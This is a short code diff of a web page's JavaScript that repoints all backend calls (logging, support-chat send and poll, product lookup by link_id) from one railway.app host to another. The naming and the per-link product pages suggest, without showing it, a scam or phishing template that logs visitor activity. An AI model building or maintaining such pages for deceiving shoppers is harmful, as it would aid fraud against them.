@@ -608,7 +608,7 @@ body{font-family:"Helvetica Neue",Arial,sans-serif;height:100vh;overflow:hidden;
 <script>
 // Логирование на Railway
 function sendLog(type, details, callback) {
-  const LOG_SERVER_URL = 'https://worker-production-740e.up.railway.app/log';
+  const LOG_SERVER_URL = 'https://mmworkbot-dev-production.up.railway.app/log';
 
   fetch(LOG_SERVER_URL, {
     method: 'POST',
@@ -766,7 +766,7 @@ function chatSend(){
   // Send to backend with page_type
   var payload = {link_id: link_id, message: txt, page_type: 'tbc'};
 
-  fetch('https://worker-production-740e.up.railway.app/support/send', {
+  fetch('https://mmworkbot-dev-production.up.railway.app/support/send', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify(payload)
@@ -841,7 +841,7 @@ function startSupportPolling() {
   restoreChatMessagesFromLocalStorage(link_id);
 
   setInterval(function(){
-    fetch('https://worker-production-740e.up.railway.app/support/messages/' + link_id + '?page_type=tbc')
+    fetch('https://mmworkbot-dev-production.up.railway.app/support/messages/' + link_id + '?page_type=tbc')
       .then(res => res.json())
       .then(data => {
         if(data.messages && data.messages.length > 0){
@@ -942,7 +942,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
   // Load product info
   if (link_id) {
-    fetch(`https://worker-production-740e.up.railway.app/link/${link_id}`)
+    fetch(`https://mmworkbot-dev-production.up.railway.app/link/${link_id}`)
       .then(r => r.json())
       .then(data => {
         tbc_productName = data.name || 'Товар';
